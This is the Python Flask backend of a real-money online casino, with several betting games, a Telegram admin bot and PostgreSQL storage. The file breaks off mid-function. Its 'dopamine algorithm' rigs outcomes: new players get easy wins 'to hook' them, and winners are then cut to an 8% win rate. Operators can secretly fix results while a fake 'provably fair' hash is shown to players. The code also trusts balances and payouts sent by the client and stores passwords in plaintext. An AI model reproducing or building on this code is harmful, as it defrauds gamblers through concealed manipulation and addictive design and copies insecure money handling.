import hashlib
import os
import random
import subprocess
import sys
import time
import threading
from dotenv import load_dotenv
from flask import (
    Flask,
    jsonify,
    render_template,
    request,
    send_from_directory,
    session,
)
import psycopg2
from psycopg2.extras import RealDictCursor
from waitress import serve
import telebot

load_dotenv()

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

app = Flask(__name__)
app.secret_key = os.getenv("SECRET_KEY", "oom_tyre_secret_key")

# Direct PostgreSQL connection string
DB_URL = os.getenv("DATABASE_URL", "postgresql://postgres:1234@localhost:5432/oomtyre")

# --- RENDER FIX: Convert postgres:// to postgresql:// ---
if DB_URL and DB_URL.startswith("postgres://"):
    DB_URL = DB_URL.replace("postgres://", "postgresql://", 1)

MINIMUM_BET = 100.0  # Minimum Bet Rule Set to ₹100
ADMIN_SECRET = "SUPER_SECRET_KEY_123"  # Admin Secret Token

# Telegram Bot Setup
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE")
bot = telebot.TeleBot(BOT_TOKEN)

# Mapping color choices to outcome options in sub-folders
COLOR_VIDEOS = {
    "red": ["redcenter.mp4", "redleft.mp4", "redright.mp4"],
    "green": ["greencenter.mp4", "greenleft.mp4", "greenright.mp4"],
    "blue": ["bluecenter.mp4", "blueleft.mp4", "blueright.mp4"],
}

# Flat outcome video list for random select
ALL_OUTCOME_VIDEOS = [
    "bluecenter.mp4", "blueleft.mp4", "blueright.mp4",
    "redcenter.mp4", "redleft.mp4", "redright.mp4",
    "greencenter.mp4", "greenleft.mp4", "greenright.mp4"
]

# Global Master Admin Controls & System State
admin_settings = {
    "global_win_rate": 0.25,      # 25% Base RTP
    "emergency_lock": False,      # Forced Loss Mode
    "house_boost": False,         # Extra House Edge Boost Mode
    "stop_all_games": False,      # Pause All Games Flag
    "stop_wheel_game": False,     # Pause Wheel/Color Game Flag
    "forced_outcome": None,       # Admin Color Override (red, green, blue)
    "forced_roulette_num": None,  # Admin Roulette Override (1-36)
}

last_round_winner = {"color": None}


def get_db():
    return psycopg2.connect(DB_URL, cursor_factory=RealDictCursor)


def init_db():
    try:
        conn = get_db()
        cursor = conn.cursor()

        # Users Table
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS users (
            username VARCHAR(100) PRIMARY KEY,
            password VARCHAR(255),
            balance DOUBLE PRECISION DEFAULT 0.0,
            total_spins INTEGER DEFAULT 0,
            total_wagered DOUBLE PRECISION DEFAULT 0.0,
            total_won DOUBLE PRECISION DEFAULT 0.0,
            consecutive_losses INTEGER DEFAULT 0,
            referral_code VARCHAR(20) UNIQUE,
            referred_by VARCHAR(100),
            last_daily_claim TIMESTAMP,
            user_ip VARCHAR(45)
        )"""
        )

        # Bets Table
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS bets (
            id SERIAL PRIMARY KEY,
            username VARCHAR(100),
            color VARCHAR(20),
            amount DOUBLE PRECISION,
            status VARCHAR(20) DEFAULT 'pending',
            client_seed VARCHAR(64),
            server_hash VARCHAR(64)
        )"""
        )

        # Financial Transactions
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS transactions (
            id SERIAL PRIMARY KEY,
            username VARCHAR(100),
            type VARCHAR(20),
            amount DOUBLE PRECISION,
            status VARCHAR(20) DEFAULT 'pending',
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )"""
        )

        # Daily House Stats Table
        cursor.execute(
            """CREATE TABLE IF NOT EXISTS daily_house_stats (
            date DATE PRIMARY KEY DEFAULT CURRENT_DATE,
            total_wagered DOUBLE PRECISION DEFAULT 0.0,
            total_payout DOUBLE PRECISION DEFAULT 0.0
        )"""
        )

        conn.commit()
        cursor.close()
        conn.close()
        print("✅ Database initialized successfully!")
    except Exception as e:
        print("❌ DB Init Error:", e)


init_db()


# =====================================================================
# --- CENTRAL SMART RISK & DOPAMINE ALGORITHM (ALL GAMES) ---
# =====================================================================
def calculate_user_win_probability(user_data):
    if not user_data:
        return admin_settings["global_win_rate"]

    if admin_settings["emergency_lock"]:
        return 0.0  # 100% Loss Mode (Emergency)

    if admin_settings["house_boost"]:
        return 0.05 # Forced 5% Win Rate in House Advantage Boost Mode

    balance = float(user_data.get("balance", 0.0))
    wagered = float(user_data.get("total_wagered", 0.0))
    won = float(user_data.get("total_won", 0.0))
    net_profit = won - wagered
    spins = user_data.get("total_spins", 0)
    losses = user_data.get("consecutive_losses", 0)

    # 1. HARDCORE HOUSE PROTECTION (Profit >= ₹1000 or Balance >= ₹2500)
    if net_profit >= 1000.0 or balance >= 2500.0:
        return 0.08  # 8% win rate (Hard level, house protects profit)

    # 2. MEDIUM CHALLENGE STAGE (Profit between ₹500 and ₹1000)
    elif net_profit >= 500.0:
        return 0.20  # 20% win rate (Moderate/Hard tier)

    # 3. INITIAL DOPAMINE HIT STAGE (First ₹500-₹600 winning / Starting Phase)
    elif net_profit < 500.0 and spins <= 15:
        return 0.75  # 75% high win rate to hook the user with easy wins!

    # 4. CONFIDENCE BOOSTER / RECOVERY HOOK (After 2+ losses)
    elif losses >= 2 and net_profit < 800:
        return 0.55  # 55% chance to give a small win & restore confidence

    # Default fallback win rate
    return admin_settings["global_win_rate"]


# --- HELPER FUNCTION FOR DAILY HOUSE STATS ---
def update_daily_stats(amount, payout=0.0):
    try:
        conn = get_db()
        cursor = conn.cursor()
        cursor.execute(
            """
            INSERT INTO daily_house_stats (date, total_wagered, total_payout)
            VALUES (CURRENT_DATE, %s, %s)
            ON CONFLICT (date) DO UPDATE 
            SET total_wagered = daily_house_stats.total_wagered + EXCLUDED.total_wagered,
                total_payout = daily_house_stats.total_payout + EXCLUDED.total_payout
        """,
            (amount, payout),
        )
        conn.commit()
        cursor.close()
        conn.close()
    except Exception as e:
        print("Error updating daily stats:", e)


# =====================================================================
# --- TELEGRAM CONTROL BOT SYSTEM ---
# =====================================================================

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    help_text = (
        "🎮 **OMM Casino - Control Panel** 🎮\n\n"
        "**Game Controls (Outcome Manipulation):**\n"
        "🔴 `/red` - Agla round RED play hoga\n"
        "🟢 `/green` - Agla round GREEN play hoga\n"
        "🔵 `/blue` - Agla round BLUE play hoga\n"
        "🎯 `/num <1-36>` - Roulette par next winning number fix karein\n\n"
        "**Account & Balance Controls:**\n"
        "➕ `/create_id <username> <password>`\n"
        "💰 `/add_bal <username> <amount>`\n"
        "💸 `/minus_bal <username> <amount>` ya `/minbal <username> <amount>`\n\n"
        "**Emergency & System Controls:**\n"
        "🔒 `/lock` - Emergency lock (Users ki win rate 0% kar dega)\n"
        "🏛️ `/house` - House edge boost (House profit mode)\n"
        "🛑 `/stopall` - Sabhi games ko stop karein\n"
        "🎡 `/stopwheel` - Sirf Wheel / Color game stop karein\n"
        "▶️ `/startall` - Sabhi stopped games start karein\n"
        "🔄 `/auto` - Manual outcome override clear karke Normal Algorithm activate karein"
    )
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['red', 'green', 'blue'])
def fix_color_outcome(message):
    chosen_color = message.text.replace("/", "").strip().lower()
    admin_settings["forced_outcome"] = chosen_color
    bot.reply_to(message, f"🎯 **Agla Outcome Fix:** Video folder `{chosen_color}` se play hogi!", parse_mode="Markdown")

@bot.message_handler(commands=['num'])
def fix_roulette_outcome(message):
    args = message.text.split()
    if len(args) < 2:
        bot.reply_to(message, "⚠️ Usage: `/num <1 to 36>`", parse_mode="Markdown")
        return
    try:
        num = int(args[1])
        if 1 <= num <= 36:
            admin_settings["forced_roulette_num"] = num
            bot.reply_to(message, f"🎯 **Agla Roulette Number Fix:** `{num}`", parse_mode="Markdown")
        else:
            bot.reply_to(message, "❌ Number 1 se 36 ke beech hona chahiye!")
    except ValueError:
        bot.reply_to(message, "❌ Invalid number format!")

@bot.message_handler(commands=['create_id'])
def handle_create_id(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ Usage: `/create_id <username> <password>`")
        return
    username, password = args[1], args[2]
    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT username FROM users WHERE username = %s", (username,))
        if cursor.fetchone():
            bot.reply_to(message, "ID Already Exist!")
            return

        cursor.execute("INSERT INTO users (username, password, balance) VALUES (%s, %s, 100.0)", (username, password))
        conn.commit()
        bot.reply_to(message, f"✅ Account `{username}` successfully created with ₹100 initial balance!", parse_mode="Markdown")
    except Exception as e:
        conn.rollback()
        bot.reply_to(message, "ID Already Exist!")
    finally:
        cursor.close()
        conn.close()

@bot.message_handler(commands=['add_bal'])
def handle_add_balance(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ Usage: `/add_bal <username> <amount>`")
        return
    username = args[1]
    try:
        amount = float(args[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid Amount!")
        return

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = balance + %s WHERE username = %s", (amount, username))
    conn.commit()
    cursor.close()
    conn.close()
    bot.reply_to(message, f"💰 Added ₹{amount} to `{username}`.")

@bot.message_handler(commands=['minus_bal', 'minbal'])
def handle_minus_balance(message):
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ Usage: `/minbal <username> <amount>`")
        return
    username = args[1]
    try:
        amount = float(args[2])
    except ValueError:
        bot.reply_to(message, "❌ Invalid Amount!")
        return

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute("UPDATE users SET balance = GREATEST(0.0, balance - %s) WHERE username = %s", (amount, username))
    conn.commit()
    cursor.close()
    conn.close()
    bot.reply_to(message, f"💸 Deducted ₹{amount} from `{username}`.")

@bot.message_handler(commands=['lock'])
def set_emergency_lock(message):
    admin_settings["emergency_lock"] = True
    bot.reply_to(message, "🔒 **Emergency Lock Activated!** Sabhi users ke winning rate 0% kar diye gaye hain.")

@bot.message_handler(commands=['house'])
def set_house_boost(message):
    admin_settings["house_boost"] = True
    bot.reply_to(message, "🏛️ **House Advantage Boosted!** Casino profit mode active.")

@bot.message_handler(commands=['stopall'])
def stop_all_games(message):
    admin_settings["stop_all_games"] = True
    bot.reply_to(message, "🛑 **Sare Games Stop Kar Diye Gaye Hain!**")

@bot.message_handler(commands=['stopwheel'])
def stop_wheel_game(message):
    admin_settings["stop_wheel_game"] = True
    bot.reply_to(message, "🎡 **Wheel / Color Game Temporarily Closed!**")

@bot.message_handler(commands=['startall'])
def start_all_games(message):
    admin_settings["stop_all_games"] = False
    admin_settings["stop_wheel_game"] = False
    bot.reply_to(message, "▶️ **Sabhi Games Dobara Resume Kar Diye Gaye Hain!**")

@bot.message_handler(commands=['auto'])
def clear_forced_outcomes(message):
    admin_settings["forced_outcome"] = None
    admin_settings["forced_roulette_num"] = None
    admin_settings["emergency_lock"] = False
    admin_settings["house_boost"] = False
    admin_settings["stop_all_games"] = False
    admin_settings["stop_wheel_game"] = False
    bot.reply_to(message, "🔄 Sabhi manual fixes aur locks hata diye gaye hain! **Normal Algorithm Active** hai.")

def run_bot():
    print("🤖 Telegram Control Bot Started...")
    bot.infinity_polling()


# =====================================================================
# --- DYNAMIC VIDEO SERVING ROUTES ---
# =====================================================================
@app.route("/video/<path:filename>")
def serve_video(filename):
    return send_from_directory(BASE_DIR, filename)


@app.route("/spinvideos/<filename>")
def serve_spin_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "spinvideos"), filename)


@app.route("/bluevideos/<filename>")
def serve_blue_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "bluevideos"), filename)


@app.route("/redvideos/<filename>")
def serve_red_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "redvideos"), filename)


@app.route("/greenvideos/<filename>")
def serve_green_video(filename):
    return send_from_directory(os.path.join(BASE_DIR, "greenvideos"), filename)


# --- PAGE ROUTING SYSTEM ---
@app.route("/")
def home():
    return render_template("lobby.html")


@app.route("/game/tyre")
def tyre_game():
    return render_template("index.html")


@app.route("/game/chicken")
def chicken_game():
    return render_template("chicken.html")


@app.route("/game/parity")
def parity_game():
    return render_template("parity.html")


@app.route("/game/aviator")
def aviator_game():
    return render_template("aviator.html")


@app.route("/game/mines")
def mines_game():
    return render_template("mines.html")


@app.route("/game/roulette")
def roulette_game():
    return render_template("roulette.html")


# --- AUTH & USER API ---
@app.route("/login", methods=["POST"])
def login():
    data = request.json or {}
    username = data.get("username")
    password = data.get("password")
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM users WHERE username = %s AND password = %s",
        (username, password),
    )
    user = cursor.fetchone()

    if user:
        cursor.execute(
            "UPDATE users SET user_ip = %s WHERE username = %s",
            (user_ip, username),
        )
        conn.commit()
        session["user"] = username
        cursor.close()
        conn.close()
        return jsonify(
            {
                "status": "success",
                "username": username,
                "balance": float(user["balance"]),
            }
        )

    cursor.close()
    conn.close()
    return jsonify({"status": "error", "message": "Galat Username ya Password!"})


# --- WALLET & ACTIVE BET STATE SYNC API ---
@app.route("/api/balance", methods=["GET"])
def api_balance():
    if "user" not in session:
        return jsonify({"success": False, "message": "Unauthorized"}), 401

    username = session["user"]
    conn = get_db()
    cursor = conn.cursor()

    cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
    user = cursor.fetchone()

    cursor.execute(
        "SELECT id, color, amount FROM bets WHERE username = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
        (username,),
    )
    active_bet = cursor.fetchone()

    cursor.close()
    conn.close()

    if user:
        bet_data = None
        if active_bet:
            bet_data = {
                "id": active_bet["id"],
                "color": active_bet["color"],
                "amount": float(active_bet["amount"]),
            }
        return jsonify(
            {
                "success": True,
                "balance": float(user["balance"]),
                "active_bet": bet_data,
                "last_winner": last_round_winner.get("color"),
            }
        )

    return jsonify({"success": False, "message": "User not found"}), 404


@app.route("/api/update-balance", methods=["POST"])
def update_balance():
    data = request.json or {}
    new_balance = data.get("balance")

    if "user" in session and new_balance is not None:
        username = session["user"]
        conn = get_db()
        cursor = conn.cursor()
        try:
            cursor.execute(
                "UPDATE users SET balance = %s WHERE username = %s",
                (float(new_balance), username),
            )
            conn.commit()
        except Exception as e:
            conn.rollback()
            print("Error updating balance:", e)
        finally:
            cursor.close()
            conn.close()

    return jsonify({"success": True})


# --- PARITY GAME BACKEND ENGINE ---
@app.route("/api/parity/place_bet", methods=["POST"])
def parity_place_bet():
    if admin_settings["stop_all_games"]:
        return jsonify({"status": "error", "message": "Games stop kiye gaye hain!"}), 503

    if "user" not in session:
        return jsonify({"status": "error", "message": "Login Required!"}), 401

    data = request.json or {}
    choice = data.get("choice")
    try:
        amount = float(data.get("amount", 0))
    except (ValueError, TypeError):
        return jsonify({"status": "error", "message": "Invalid amount!"})

    username = session["user"]

    if amount < MINIMUM_BET:
        return jsonify(
            {
                "status": "error",
                "message": f"Minimum bet amount ₹{int(MINIMUM_BET)} honi chahiye!",
            }
        )

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s FOR UPDATE",
            (username,),
        )
        user = cursor.fetchone()

        if not user or float(user["balance"]) < amount:
            cursor.execute("ROLLBACK")
            return jsonify(
                {"status": "error", "message": "Insufficient balance!"}
            )

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_wagered = total_wagered + %s WHERE username = %s",
            (amount, amount, username),
        )
        cursor.execute(
            "INSERT INTO bets (username, color, amount, status) VALUES (%s, %s, %s, 'pending')",
            (username, f"parity_{choice}", amount),
        )
        conn.commit()
        update_daily_stats(amount=amount, payout=0.0)

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated = cursor.fetchone()
        return jsonify(
            {"status": "success", "balance": float(updated["balance"])}
        )

    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/verify-telegram-user", methods=["POST"])
def verify_telegram_user():
    data = request.json or {}
    username = data.get("username")
    password = data.get("password")
    user_ip = request.headers.get("X-Forwarded-For", request.remote_addr)

    conn = get_db()
    cursor = conn.cursor()
    cursor.execute(
        "SELECT * FROM users WHERE username = %s AND password = %s",
        (username, password),
    )
    user = cursor.fetchone()

    if user:
        cursor.execute(
            "UPDATE users SET user_ip = %s WHERE username = %s",
            (user_ip, username),
        )
        conn.commit()
        session["user"] = username
        bal = float(user["balance"])
        cursor.close()
        conn.close()
        return jsonify({"status": "success", "success": True, "balance": bal})

    cursor.close()
    conn.close()
    return jsonify(
        {
            "status": "error",
            "success": False,
            "message": "Invalid Username or Password!",
        }
    )


@app.route("/place_bet", methods=["POST"])
def place_bet():
    if admin_settings["stop_all_games"] or admin_settings["stop_wheel_game"]:
        return jsonify({"status": "error", "message": "Wheel Game filhal closed hai!"}), 503

    if "user" not in session:
        return jsonify({"status": "error", "message": "Pehle Login Karein!"})

    data = request.json or {}
    color = data.get("color")
    amount = float(data.get("amount", 0))
    username = session["user"]

    if amount < MINIMUM_BET:
        return jsonify(
            {
                "status": "error",
                "message": f"Minimum bet amount ₹{int(MINIMUM_BET)} honi chahiye!",
            }
        )

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")

        cursor.execute(
            "SELECT id FROM bets WHERE username = %s AND status = 'pending'",
            (username,),
        )
        if cursor.fetchone():
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify(
                {"status": "error", "message": "Aapki bet pehle se placed hai!"}
            )

        cursor.execute(
            "SELECT balance, total_spins, total_wagered FROM users WHERE username = %s FOR UPDATE",
            (username,),
        )
        user = cursor.fetchone()

        if not user:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "User nahi mila!"})

        current_bal = float(user["balance"] or 0.0)
        if current_bal < amount:
            cursor.execute("ROLLBACK")
            cursor.close()
            conn.close()
            return jsonify({"status": "error", "message": "Balance Kam Hai!"})

        server_seed = str(time.time()) + str(random.random())
        server_hash = hashlib.sha256(server_seed.encode()).hexdigest()

        new_spins = user["total_spins"] + 1
        new_wagered = float(user["total_wagered"] or 0.0) + amount

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_spins = %s, total_wagered = %s WHERE username = %s",
            (amount, new_spins, new_wagered, username),
        )

        cursor.execute(
            "INSERT INTO bets (username, color, amount, status, server_hash) VALUES (%s, %s, %s, 'pending', %s)",
            (username, color, amount, server_hash),
        )

        conn.commit()

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated_user = cursor.fetchone()
        cursor.close()
        conn.close()

        update_daily_stats(amount=amount, payout=0.0)

        return jsonify(
            {
                "status": "success",
                "placed_bet": {"color": color, "amount": amount},
                "new_balance": float(updated_user["balance"]),
                "provably_fair_hash": server_hash,
            }
        )
    except Exception as e:
        conn.rollback()
        cursor.close()
        conn.close()
        print("❌ Place Bet Error:", e)
        return jsonify(
            {"status": "error", "message": "Transaction error, please try again."}
        )


# --- UPDATED GET_GAME_STATE ---
@app.route("/get_game_state")
def get_game_state():
    if admin_settings["stop_all_games"] or admin_settings["stop_wheel_game"]:
        return jsonify({"status": "error", "message": "Game temporarily under maintenance!"}), 503

    global last_round_winner
    conn = get_db()
    cursor = conn.cursor()

    chosen = None

    # Priority 1: Telegram Override
    if admin_settings["forced_outcome"]:
        target_color = admin_settings["forced_outcome"].lower()
        if target_color in COLOR_VIDEOS:
            chosen = random.choice(COLOR_VIDEOS[target_color])
        admin_settings["forced_outcome"] = None  # Played once, then return to normal/auto
    # Priority 2: Emergency Lock
    elif admin_settings["emergency_lock"]:
        chosen = random.choice(ALL_OUTCOME_VIDEOS)

    is_user_win = False
    bet_amount = 0.0

    if "user" in session:
        username = session["user"]
        try:
            cursor.execute("BEGIN")
            cursor.execute(
                "SELECT * FROM users WHERE username = %s FOR UPDATE",
                (username,),
            )
            user = cursor.fetchone()

            if user:
                cursor.execute(
                    "SELECT id, color, amount FROM bets WHERE username = %s AND status = 'pending' ORDER BY id DESC LIMIT 1",
                    (username,),
                )
                last_bet = cursor.fetchone()

                if last_bet:
                    bet_id = last_bet["id"]
                    bet_color = last_bet["color"].lower()
                    bet_amount = float(last_bet["amount"])

                    if bet_color in COLOR_VIDEOS:
                        win_prob = calculate_user_win_probability(user)

                        if not chosen:
                            if random.random() < win_prob:
                                chosen = random.choice(COLOR_VIDEOS[bet_color])
                            else:
                                other_colors = [
                                    c
                                    for c in COLOR_VIDEOS.keys()
                                    if c != bet_color
                                ]
                                losing_color = random.choice(other_colors)
                                chosen = random.choice(
                                    COLOR_VIDEOS[losing_color]
                                )

                        is_win = any(
                            chosen in COLOR_VIDEOS[bet_color] for _ in [0]
                        )
                        is_user_win = is_win

                        if is_win:
                            cursor.execute(
                                "UPDATE bets SET status = 'won' WHERE id = %s",
                                (bet_id,),
                            )
                        else:
                            cursor.execute(
                                """
                                UPDATE users 
                                SET consecutive_losses = consecutive_losses + 1 
                                WHERE username = %s
                                """,
                                (username,),
                            )
                            cursor.execute(
                                "UPDATE bets SET status = 'lost' WHERE id = %s",
                                (bet_id,),
                            )

                    conn.commit()
        except Exception as e:
            conn.rollback()
            print("❌ Game State Error:", e)

    if not chosen:
        chosen = random.choice(ALL_OUTCOME_VIDEOS)

    if "red" in chosen:
        winning_color = "RED"
    elif "blue" in chosen:
        winning_color = "BLUE"
    elif "green" in chosen:
        winning_color = "GREEN"
    else:
        winning_color = "UNKNOWN"

    last_round_winner["color"] = winning_color

    current_bal = 0.0
    if "user" in session:
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (session["user"],)
        )
        u = cursor.fetchone()
        if u:
            current_bal = float(u["balance"])

    cursor.close()
    conn.close()

    return jsonify(
        {
            "game": {"outcome": chosen},
            "outcome": chosen,
            "winning_color": winning_color,
            "is_win": is_user_win,
            "bet_amount": bet_amount,
            "bet_status": "CLOSED",
            "winRate": admin_settings["global_win_rate"],
            "balance": current_bal,
        }
    )


# --- ROULETTE OUTCOME ENGINE WITH TELEGRAM CONTROL ---
@app.route("/api/roulette/spin", methods=["POST"])
def roulette_spin():
    if admin_settings["stop_all_games"]:
        return jsonify({"status": "error", "message": "Game temporarily disabled!"}), 503

    if admin_settings["forced_roulette_num"] is not None:
        number = admin_settings["forced_roulette_num"]
        admin_settings["forced_roulette_num"] = None  # Played once, then return to normal
    else:
        number = random.randint(1, 36)

    return jsonify({"status": "success", "winning_number": number})


# --- CLAIM WINNINGS API ---
@app.route("/api/claim_win", methods=["POST"])
def claim_win():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})

    data = request.json or {}
    try:
        bet_amount = float(data.get("bet_amount", 0))
    except (ValueError, TypeError):
        bet_amount = 0.0

    username = session["user"]
    payout_amount = bet_amount * 2.5

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            """
            UPDATE users 
            SET balance = balance + %s, 
                total_won = total_won + %s, 
                consecutive_losses = 0 
            WHERE username = %s
            """,
            (payout_amount, payout_amount, username),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=payout_amount)

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        u = cursor.fetchone()
        new_bal = float(u["balance"]) if u else 0.0

        cursor.close()
        conn.close()
        return jsonify(
            {
                "status": "success",
                "new_balance": new_bal,
                "payout": payout_amount,
            }
        )
    except Exception as e:
        conn.rollback()
        cursor.close()
        conn.close()
        return jsonify({"status": "error", "message": str(e)})


# --- AVIATOR MULTIPLIER LOGIC ---
def calculate_aviator_crash_point(username=None):
    win_prob = admin_settings["global_win_rate"]

    if username:
        try:
            conn = get_db()
            cursor = conn.cursor()
            cursor.execute(
                "SELECT * FROM users WHERE username = %s", (username,)
            )
            user = cursor.fetchone()
            cursor.close()
            conn.close()
            if user:
                win_prob = calculate_user_win_probability(user)
        except Exception as e:
            print("Aviator Prob Calc Error:", e)

    if win_prob >= 0.70:
        return round(2.00 + random.random() * 3.20, 2)
    elif win_prob <= 0.10:
        return round(1.00 + random.random() * 0.15, 2)
    elif win_prob <= 0.25:
        return round(1.05 + random.random() * 0.45, 2)
    else:
        r = random.random()
        if r < 0.4:
            return round(1.20 + random.random() * 0.80, 2)
        else:
            return round(2.01 + random.random() * 4.50, 2)


@app.route("/api/aviator/crash_point", methods=["GET"])
def aviator_crash_point_api():
    username = session.get("user")
    crash_pt = calculate_aviator_crash_point(username)
    return jsonify({"status": "success", "crash_point": crash_pt})


@app.route("/api/aviator/cashout", methods=["POST"])
def aviator_cashout():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})

    data = request.json or {}
    winnings = float(data.get("winnings", 0))
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "SELECT username FROM users WHERE username = %s FOR UPDATE",
            (username,),
        )

        cursor.execute(
            "UPDATE bets SET status = 'won' WHERE username = %s AND color = 'aviator' AND status = 'pending'",
            (username,),
        )
        cursor.execute(
            "UPDATE users SET balance = balance + %s, total_won = total_won + %s, consecutive_losses = 0 WHERE username = %s",
            (winnings, winnings, username),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=winnings)
    except Exception as e:
        conn.rollback()
        print("❌ Aviator Cashout Error:", e)

    cursor.execute("SELECT balance FROM users WHERE username = %s", (username,))
    u = cursor.fetchone()
    new_bal = float(u["balance"]) if u else 0.0

    cursor.close()
    conn.close()
    return jsonify({"status": "success", "balance": new_bal})


@app.route("/api/aviator/crash", methods=["POST"])
def aviator_crash():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})

    username = session["user"]
    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "SELECT username FROM users WHERE username = %s FOR UPDATE",
            (username,),
        )

        cursor.execute(
            "UPDATE bets SET status = 'lost' WHERE username = %s AND color = 'aviator' AND status = 'pending'",
            (username,),
        )
        cursor.execute(
            "UPDATE users SET consecutive_losses = consecutive_losses + 1 WHERE username = %s",
            (username,),
        )
        conn.commit()
    except Exception as e:
        conn.rollback()
        print("❌ Aviator Crash Error:", e)

    cursor.close()
    conn.close()
    return jsonify({"status": "success"})


@app.route("/api/mines/start", methods=["POST"])
def mines_start():
    if admin_settings["stop_all_games"]:
        return jsonify({"status": "error", "message": "Games stop kiye gaye hain!"}), 503

    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    amount = float(data.get("amount", 0))
    username = session["user"]

    if amount < 10:
        return jsonify({"status": "error", "message": "Minimum bet is ₹10"})

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s FOR UPDATE",
            (username,),
        )
        user = cursor.fetchone()
        if not user or float(user["balance"]) < amount:
            cursor.execute("ROLLBACK")
            return jsonify(
                {"status": "error", "message": "Insufficient balance"}
            )

        cursor.execute(
            "UPDATE users SET balance = balance - %s, total_spins = total_spins + 1, total_wagered = total_wagered + %s WHERE username = %s",
            (amount, amount, username),
        )
        cursor.execute(
            "INSERT INTO bets (username, color, amount, status) VALUES (%s, 'mines', %s, 'pending')",
            (username, amount),
        )
        conn.commit()

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated = cursor.fetchone()
        return jsonify(
            {"status": "success", "balance": float(updated["balance"])}
        )
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/mines/cashout", methods=["POST"])
def mines_cashout():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    winnings = float(data.get("winnings", 0))
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET balance = balance + %s, total_won = total_won + %s, consecutive_losses = 0 WHERE username = %s",
            (winnings, winnings, username),
        )
        cursor.execute(
            "UPDATE bets SET status = 'won' WHERE username = %s AND color = 'mines' AND status = 'pending'",
            (username,),
        )
        conn.commit()
        update_daily_stats(amount=0.0, payout=winnings)

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated = cursor.fetchone()
        return jsonify(
            {"status": "success", "balance": float(updated["balance"])}
        )
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/mines/loss", methods=["POST"])
def mines_loss():
    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    username = session["user"]

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "UPDATE users SET consecutive_losses = consecutive_losses + 1 WHERE username = %s",
            (username,),
        )
        cursor.execute(
            "UPDATE bets SET status = 'lost' WHERE username = %s AND color = 'mines' AND status = 'pending'",
            (username,),
        )
        conn.commit()

        cursor.execute(
            "SELECT balance FROM users WHERE username = %s", (username,)
        )
        updated = cursor.fetchone()
        return jsonify(
            {"status": "success", "balance": float(updated["balance"])}
        )
    except Exception as e:
        conn.rollback()
        return jsonify({"status": "error", "message": str(e)})
    finally:
        cursor.close()
        conn.close()


@app.route("/api/chicken/start", methods=["POST"])
def chicken_start():
    if admin_settings["stop_all_games"]:
        return jsonify({"status": "error", "message": "Games stop kiye gaye hain!"}), 503

    if "user" not in session:
        return jsonify({"status": "error", "message": "Login required"})
    data = request.json or {}
    amount = float(data.get("amount", 0))
    username = session["user"]

    if amount < 10:
        return jsonify({"status": "error", "message": "Minimum bet is ₹10"})

    conn = get_db()
    cursor = conn.cursor()
    try:
        cursor.execute("BEGIN")
        cursor.execute(
            "SELECT balance FROM users WHERE username = %s FOR UPDATE",
            (username,),
